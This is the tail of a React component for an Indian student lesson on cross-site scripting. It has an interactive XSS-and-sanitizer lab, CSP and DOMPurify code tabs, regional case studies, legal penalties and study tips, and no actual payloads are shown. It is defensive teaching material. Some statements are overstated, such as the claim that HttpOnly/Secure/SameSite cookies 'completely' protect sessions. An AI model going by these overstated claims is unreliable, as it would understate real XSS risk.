                <span className="font-bold text-white text-[11px] leading-tight line-clamp-2">{item.name}</span>
              </button>
            ))}
          </div>

          {/* Active Detail Box */}
          <div className="bg-[#070b14] p-5 sm:p-6 rounded-xl border border-gray-800 space-y-6">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-gray-800 pb-4">
              <div>
                <div className="flex items-center gap-2 flex-wrap">
                  <span className={clsx("text-xs font-bold px-2.5 py-0.5 rounded border", activeXss.categoryBadge)}>
                    {activeXss.category}
                  </span>
                  <span className="text-xs px-2.5 py-0.5 rounded bg-gray-900 border border-gray-800 text-cyan-400 font-mono">
                    Scope: {activeXss.executionScope}
                  </span>
                  <span className="text-xs px-2.5 py-0.5 rounded bg-amber-950/80 border border-amber-800 text-amber-300 font-mono text-[11px]">
                    Payload: {activeXss.typicalPayload}
                  </span>
                </div>
                <h3 className="text-lg font-bold text-white mt-2">{activeXss.name}</h3>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-5 text-xs">
              <div className="space-y-4">
                <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-1.5">
                  <span className="font-bold text-rose-400 uppercase tracking-wider text-[10px] block">
                    Vulnerability Mechanics &amp; Browser DOM Exploitation
                  </span>
                  <p className="text-gray-300 leading-relaxed">{activeXss.vulnerabilityMechanism}</p>
                </div>

                <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-1.5">
                  <span className="font-bold text-emerald-400 uppercase tracking-wider text-[10px] block">
                    Enterprise Mitigation Pattern
                  </span>
                  <p className="text-gray-300 leading-relaxed font-semibold">{activeXss.mitigationPattern}</p>
                </div>
              </div>

              <div className="space-y-4">
                <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-1.5">
                  <span className="font-bold text-indigo-400 uppercase tracking-wider text-[10px] block">
                    Exploitation &amp; Execution Blueprint
                  </span>
                  <pre className="bg-black/90 p-3 rounded font-mono text-[11px] text-indigo-200 overflow-x-auto whitespace-pre-wrap border border-indigo-950/50">
                    {activeXss.codeSnippet}
                  </pre>
                </div>
              </div>
            </div>
          </div>
        </section>

        {/* SECTION 4: Studio 2 - Live XSS Context & DOM Sanitizer Laboratory */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-emerald-400">
              Interactive Concept Studio 2
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              4. XSS Context &amp; DOM Sanitizer Interactive Laboratory
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Enter an untrusted XSS payload, select the Rendering Context, and toggle Defensive Sanitizers to observe 
              HTML parser state transitions, DOM tree mutations, and verified exploit execution:
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            {/* Input Controls */}
            <div className="bg-[#050811] p-5 rounded-xl border border-gray-800 space-y-4 text-xs">
              <h3 className="font-bold text-white uppercase tracking-wider text-[11px]">XSS Lab Parameters</h3>

              <div className="space-y-1">
                <span className="text-gray-400 block">1. Untrusted Client Payload Input:</span>
                <input
                  type="text"
                  value={rawPayloadInput}
                  onChange={(e) => setRawPayloadInput(e.target.value)}
                  className="w-full p-2 bg-gray-950 rounded border border-gray-800 text-cyan-300 font-mono text-xs focus:border-cyan-500 outline-none"
                />
              </div>

              <div className="space-y-1 pt-1 border-t border-gray-800">
                <span className="text-gray-400 block">2. HTML Rendering Context:</span>
                <div className="grid grid-cols-1 gap-1.5">
                  {[
                    { id: "html_body", label: "HTML Body Context (<div>...</div>)" },
                    { id: "attribute_val", label: "Attribute Context (<input value=\"...\">)" },
                    { id: "javascript_block", label: "JavaScript Block (<script>var x='...'</script>)" },
                    { id: "url_href", label: "Hyperlink Context (<a href=\"...\">)" }
                  ].map((ctx) => (
                    <button
                      key={ctx.id}
                      onClick={() => setRenderingContext(ctx.id)}
                      className={clsx(
                        "p-2 rounded border font-bold text-[10px] text-left transition-all",
                        renderingContext === ctx.id
                          ? "bg-rose-950 border-rose-500 text-rose-300"
                          : "bg-gray-950 border-gray-800 text-gray-400"
                      )}
                    >
                      {ctx.label}
                    </button>
                  ))}
                </div>
              </div>

              <div className="space-y-1 pt-1 border-t border-gray-800">
                <span className="text-gray-400 block">3. Defensive Sanitization Defense:</span>
                <div className="grid grid-cols-1 gap-1.5">
                  {[
                    { id: "none_vulnerable", label: "No Sanitization (Vulnerable Direct Render)" },
                    { id: "html_entities", label: "Basic HTML Entity Encoding (&lt;, &gt;)" },
                    { id: "dompurify_sanitized", label: "DOMPurify Sanitization (Purified DOM)" },
                    { id: "strict_csp_nonce", label: "Strict Nonce-Based CSP (Browser Gating)" }
                  ].map((san) => (
                    <button
                      key={san.id}
                      onClick={() => setSanitizationMode(san.id)}
                      className={clsx(
                        "p-2 rounded border font-bold text-[10px] text-left transition-all",
                        sanitizationMode === san.id
                          ? "bg-emerald-950 border-emerald-500 text-emerald-300"
                          : "bg-gray-950 border-gray-800 text-gray-400"
                      )}
                    >
                      {san.label}
                    </button>
                  ))}
                </div>
              </div>
            </div>

            {/* Calculated Output Metrics & DOM Rendering Preview */}
            <div className="bg-[#050811] p-5 rounded-xl border border-gray-800 col-span-1 md:col-span-2 space-y-4 text-xs">
              <div className="flex justify-between items-center border-b border-gray-800 pb-2">
                <h3 className="font-bold text-white uppercase tracking-wider text-[11px]">Browser DOM Execution Preview</h3>
                <span className={clsx("text-xs px-2.5 py-0.5 rounded font-mono font-bold border", simulationResults.isXssExecuted ? "bg-rose-950 text-rose-300 border-rose-800" : "bg-emerald-950 text-emerald-300 border-emerald-800")}>
                  {simulationResults.isXssExecuted ? "XSS EXECUTED (Origin Hijacked!)" : "SAFE (Zero Script Execution)"}
                </span>
              </div>

              <div className="bg-gray-950 p-3 rounded-lg border border-gray-800 space-y-1.5">
                <span className="text-gray-400 text-[10px] uppercase block">Rendered HTML Markup in Browser DOM:</span>
                <pre className="p-2.5 bg-black/90 rounded font-mono text-xs text-cyan-300 overflow-x-auto whitespace-pre-wrap border border-cyan-950/60">
                  {simulationResults.renderedMarkup}
                </pre>
              </div>

              <div className="grid grid-cols-2 gap-3">
                <div className="bg-gray-950 p-3 rounded-lg border border-gray-800">
                  <span className="text-gray-400 text-[10px] uppercase block">Parser Finite State</span>
                  <span className="text-xs font-bold text-amber-300 mt-1 block">{simulationResults.parserState}</span>
                </div>

                <div className="bg-gray-950 p-3 rounded-lg border border-gray-800">
                  <span className="text-gray-400 text-[10px] uppercase block">Exploitability Probability</span>
                  <span className={clsx("text-lg font-extrabold mt-0.5 block", simulationResults.isXssExecuted ? "text-rose-400" : "text-emerald-400")}>
                    {simulationResults.exploitabilityPct}%
                  </span>
                </div>
              </div>

              <div className={clsx("p-4 rounded-lg border font-mono text-xs", simulationResults.badgeClass)}>
                <span className="font-bold block uppercase tracking-wider text-[10px]">XSS Parser Security Assessment:</span>
                <p className="mt-1 font-extrabold text-sm leading-relaxed">{simulationResults.statusMessage}</p>
              </div>
            </div>
          </div>
        </section>

        {/* SECTION 5: Studio 4 - XSS Hardening Code Studio */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-purple-400">
              Strict CSP &amp; DOMPurify Studio
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              5. Production Helmet.js Strict Nonce CSP, React DOMPurify &amp; Context Encoder Studio
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Explore production implementations of Helmet.js strict nonce-based Content Security Policy, 
              React DOMPurify safe rich text rendering, and Node.js context-aware output encoders:
            </p>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-3 gap-2">
            {Object.entries(codeDatabase).map(([key, item]) => (
              <button
                key={key}
                onClick={() => setActiveCodeTab(key)}
                className={clsx(
                  "p-3 rounded-xl border text-left transition-all duration-300 text-xs font-bold",
                  activeCodeTab === key
                    ? "bg-purple-950 border-purple-500 text-purple-300 shadow-md shadow-purple-950/50"
                    : "bg-[#0b101c] border-gray-800 hover:border-gray-700 text-gray-400"
                )}
              >
                {item.name}
              </button>
            ))}
          </div>

          <div className="bg-[#050811] p-5 sm:p-6 rounded-xl border border-gray-800 space-y-4">
            <div className="flex items-center justify-between border-b border-gray-800 pb-3">
              <h3 className="text-sm font-bold text-white">{activeCode.name}</h3>
              <span className="text-xs px-2.5 py-0.5 rounded bg-gray-900 border border-gray-800 text-purple-400 font-mono">
                Production Pattern
              </span>
            </div>

            <p className="text-xs text-gray-300">{activeCode.explanation}</p>

            <pre className="bg-black/90 p-4 rounded-lg font-mono text-xs text-purple-200 overflow-x-auto whitespace-pre-wrap border border-purple-950/50">
              {activeCode.code}
            </pre>
          </div>
        </section>

        {/* SECTION 6: Studio 3 - Regional West Bengal Pedagogical Case Studies */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-amber-400">
              Regional Engineering Applications
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              6. West Bengal Field Case Studies: Kolkata, Barrackpore, Ichapur &amp; Jadavpur
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Explore how cybersecurity leaders Mamata, Debangshu, Mahima, and Susmita eliminate Stored XSS session theft in Salt Lake, 
              harden SCADA telemetry consoles against DOM XSS in Barrackpore, and secure oncology records in Ichapur:
            </p>
          </div>

          {/* Scenario Tabs */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
            {localScenarios.map((sc) => (
              <button
                key={sc.id}
                onClick={() => setActiveScenarioId(sc.id)}
                className={clsx(
                  "p-4 rounded-xl border text-left transition-all duration-300 space-y-2",
                  activeScenarioId === sc.id
                    ? "bg-amber-950/60 border-amber-500 shadow-md"
                    : "bg-[#0b101c] border-gray-800 hover:border-gray-700 text-gray-400"
                )}
              >
                <span className="text-[10px] font-bold px-2 py-0.5 rounded bg-gray-900 text-amber-300 border border-amber-800">
                  {sc.lead} · {sc.location.split(" ")[0]}
                </span>
                <h4 className="text-xs font-bold text-white line-clamp-1">{sc.title}</h4>
                <p className="text-[11px] text-gray-400 line-clamp-1">{sc.threatType}</p>
              </button>
            ))}
          </div>

          {/* Active Scenario Detailed Breakdown */}
          <div className="bg-[#070b14] p-6 rounded-xl border border-gray-800 space-y-5">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-gray-800 pb-3">
              <div>
                <span className="text-xs font-bold text-amber-400 uppercase tracking-wider">
                  {activeScenario.location}
                </span>
                <h3 className="text-base sm:text-lg font-bold text-white mt-0.5">{activeScenario.title}</h3>
              </div>
              <div className="text-right text-xs">
                <span className="text-gray-400 block">Lead Architect: {activeScenario.lead}</span>
                <span className="font-semibold text-emerald-400">Security Budget: {activeScenario.budget}</span>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-5 text-xs">
              <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-2">
                <span className="font-bold text-rose-400 uppercase tracking-wider text-[10px]">
                  The Incident &amp; XSS Vector
                </span>
                <p className="text-gray-300 leading-relaxed">{activeScenario.incident}</p>
              </div>

              <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-2">
                <span className="font-bold text-emerald-400 uppercase tracking-wider text-[10px]">
                  Architectural Defense &amp; Resolution
                </span>
                <p className="text-gray-300 leading-relaxed">{activeScenario.defenseStrategy}</p>
              </div>
            </div>

            {/* Metrics Dashboard */}
            <div className="bg-[#050811] p-4 rounded-lg border border-gray-800 grid grid-cols-2 sm:grid-cols-4 gap-3 text-center">
              {Object.entries(activeScenario.metrics).map(([key, val]) => (
                <div key={key} className="bg-gray-950 p-2.5 rounded border border-gray-800/80">
                  <span className="text-[10px] text-gray-400 uppercase tracking-wider block capitalize">
                    {key.replace(/([A-Z])/g, " $1")}
                  </span>
                  <span className="text-xs sm:text-sm font-extrabold text-white mt-1 block">{val}</span>
                </div>
              ))}
            </div>
          </div>
        </section>

        {/* SECTION 7: Statutory & Legal Frameworks in India */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-purple-400">
              Statutory Jurisprudence
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              7. Legal Penalties for Cross-Site Scripting (XSS) &amp; Identity Theft in India
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Indian cyber law, identity protection statutes, and personal data protection frameworks 
              strictly penalize injecting XSS to steal session credentials or impersonate users with severe civil compensation liabilities and criminal imprisonment:
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-5 text-xs">
            <div className="bg-gray-950 p-5 rounded-xl border border-rose-950 space-y-3">
              <span className="text-xs font-bold text-rose-400 uppercase tracking-wider block">
                IT Act 2000 Section 66C &amp; 66D
              </span>
              <ul className="space-y-2 text-gray-300">
                <li>
                  <strong className="text-white">Section 66C:</strong> Identity theft &amp; session token misuse (Up to 3 years prison + ₹1 Lakh fine).
                </li>
                <li>
                  <strong className="text-white">Section 66D:</strong> Personation cheating using computer resources (Up to 3 years prison).
                </li>
              </ul>
            </div>

            <div className="bg-gray-950 p-5 rounded-xl border border-blue-950 space-y-3">
              <span className="text-xs font-bold text-blue-400 uppercase tracking-wider block">
                IT Act Section 43(a) &amp; 70
              </span>
              <ul className="space-y-2 text-gray-300">
                <li>
                  <strong className="text-white">Section 43(a):</strong> Civil damages up to <span className="text-rose-400 font-bold">₹1 CRORE</span> for unauthorized computer access/damage.
                </li>
                <li>
                  <strong className="text-white">Section 70:</strong> Protected Systems attack (Up to 10 years prison).
                </li>
              </ul>
            </div>

            <div className="bg-gray-950 p-5 rounded-xl border border-emerald-950 space-y-3">
              <span className="text-xs font-bold text-emerald-400 uppercase tracking-wider block">
                DPDP Act 2023 &amp; IPC 420
              </span>
              <ul className="space-y-2 text-gray-300">
                <li>
                  <strong className="text-white">DPDP Section 33:</strong> Fines up to <span className="text-rose-400 font-bold">₹250 CRORES</span> for failing to prevent data breaches.
                </li>
                <li>
                  <strong className="text-white">IPC Section 420:</strong> Financial redirection fraud via XSS (Up to 7 years prison).
                </li>
              </ul>
            </div>
          </div>
        </section>

        {/* SECTION 8: Common Pitfalls, Pro Tips, Thinking Hints & Mini Checklist */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-purple-400">
              Exam &amp; Professional Mastery
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              8. Common Pitfalls, Industry Best Practices &amp; Key Hints
            </h2>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-5 text-xs">
            {/* Common Pitfalls */}
            <div className="bg-gray-950 p-4 rounded-xl border border-rose-950/60 space-y-3">
              <span className="font-bold text-rose-400 uppercase tracking-wider text-[10px] block">
                Common Beginner Mistakes
              </span>
              <ul className="space-y-2 text-gray-300 list-disc list-inside">
                <li>
                  <strong>Using `innerHTML` Directly in Client JS:</strong> Creates fatal DOM XSS vulnerabilities.
                </li>
                <li>
                  <strong>Relying on HTML Entity Encoding Inside `<script>`:</strong> Fails; requires Unicode hex encoding.
                </li>
                <li>
                  <strong>Allowing `javascript:` in `<a href>` Links:</strong> Bypasses standard HTML escaping.
                </li>
              </ul>
            </div>

            {/* Professional Tips */}
            <div className="bg-gray-950 p-4 rounded-xl border border-emerald-950/60 space-y-3">
              <span className="font-bold text-emerald-400 uppercase tracking-wider text-[10px] block">
                Professional Tips &amp; Tricks
              </span>
              <ul className="space-y-2 text-gray-300 list-disc list-inside">
                <li>
                  <strong>Deploy Strict Nonce-Based Content Security Policy:</strong> Blocks all unauthorized inline scripts.
                </li>
                <li>
                  <strong>Use DOMPurify for Rich HTML:</strong> Sanitizes HTML while preserving safe formatting.
                </li>
                <li>
                  <strong>Always Set `HttpOnly; Secure; SameSite=Strict`:</strong> Completely protects session cookies.
                </li>
              </ul>
            </div>

            {/* Hint Section */}
            <div className="bg-gray-950 p-4 rounded-xl border border-indigo-950/60 space-y-3">
              <span className="font-bold text-indigo-400 uppercase tracking-wider text-[10px] block">
                Pedagogical Thinking Hints
              </span>
              <ul className="space-y-2 text-gray-300">
                <li className="p-2 bg-gray-900 rounded border border-gray-800">
                  <span className="text-indigo-300 font-bold block">Think about...</span>
                  Why does `HttpOnly` prevent JavaScript from reading `document.cookie`, but still fail to block background API calls?
                </li>
                <li className="p-2 bg-gray-900 rounded border border-gray-800">
                  <span className="text-indigo-300 font-bold block">Observe carefully...</span>
                  How does DOM-Based XSS execute entirely inside the client's browser without sending any payload to the server?
                </li>
                <li className="p-2 bg-gray-900 rounded border border-gray-800">
                  <span className="text-indigo-300 font-bold block">Try changing this...</span>
                  In the laboratory above, switch Sanitization to DOMPurify or Strict Nonce CSP and observe Exploitability drop to 0.00%!
                </li>
              </ul>
            </div>
          </div>

          {/* Mini Checklist */}
          <div className="bg-gray-950 p-5 rounded-xl border border-gray-800 space-y-3">
            <h3 className="text-xs font-bold text-white uppercase tracking-wider text-rose-400">
              Student Mini Checklist (Exam &amp; Career Essentials)
            </h3>
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2.5 text-xs text-gray-300">
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>XSS executes JavaScript in the victim's browser, completely bypassing Same-Origin Policy (SOP).</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>Stored XSS is permanent in the database, Reflected bounces off the server, DOM executes in JS.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>`HttpOnly` stops JavaScript cookie theft, but doesn't prevent background authenticated API calls.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>Strict Nonce-Based Content Security Policy (CSP) blocks all scripts lacking the random nonce.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>DOMPurify sanitizes rich HTML markup before rendering inside React/Vue SPAs.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>Section 66C of the IT Act penalizes session token theft and identity misuse with up to 3 years prison.</span>
              </div>
            </div>
          </div>
        </section>

        {/* SECTION 9: FAQ Template */}
        <section className="space-y-4">
          <FAQTemplate
            title="Cross-Site Scripting (XSS) FAQs"
            subtitle="30 Moderate to Expert Practice Questions & XSS Architecture Deep Dives"
            questions={questions}
          />
        </section>

        {/* SECTION 10: PlainTextPrint Component */}
        <section className="space-y-4">
          <PlainTextPrint
            content={noteText}
            title="Cross-Site Scripting (XSS): Stored, Reflected, and DOM-based XSS (Printable Study Guide)"
            stampEnabled={true}
            showDownload={true}
            downloadButtonText="Download Note"
            downloadFileName="topic7_note.txt"
          />
        </section>

        {/* SECTION 11: Dedicated Teacher's Note */}
        <section className="pt-4">
          <Teacher
            note="Teacher's Note: Cross-Site Scripting (XSS) represents the ultimate client-side injection threat, weaponizing the victim's own browser against them! Understand the three core XSS categories: 1. Stored XSS (payload stored permanently in database comments or profiles, infecting every user who visits); 2. Reflected XSS (payload echoed immediately in HTTP responses from search or error parameters); 3. DOM-Based XSS (untrusted client data from `location.hash` flows directly into client-side sinks like `element.innerHTML` without touching the backend server). Understand why generic HTML encoding is insufficient: user data in JavaScript blocks requires Unicode hex encoding (`\\u0027`), and link `href` attributes require strict protocol whitelisting to block `javascript:` pseudo-protocols. Implement enterprise defense-in-depth: 1. Deploy a Strict Nonce-Based Content Security Policy (`script-src 'self' 'nonce-...'`); 2. Sanitize rich HTML markup with DOMPurify; 3. Protect session tokens with `HttpOnly; Secure; SameSite=Strict` cookie flags. Remember that Section 66C of the Indian IT Act penalizes session token theft and identity misuse with up to 3 years imprisonment, Section 66D penalizes personation cheating, and Section 43(a) provides civil damages up to ₹1 Crore for unauthorized computer access!"
          />
        </section>

      </div>
    </div>
  );
};

export default Topic7;
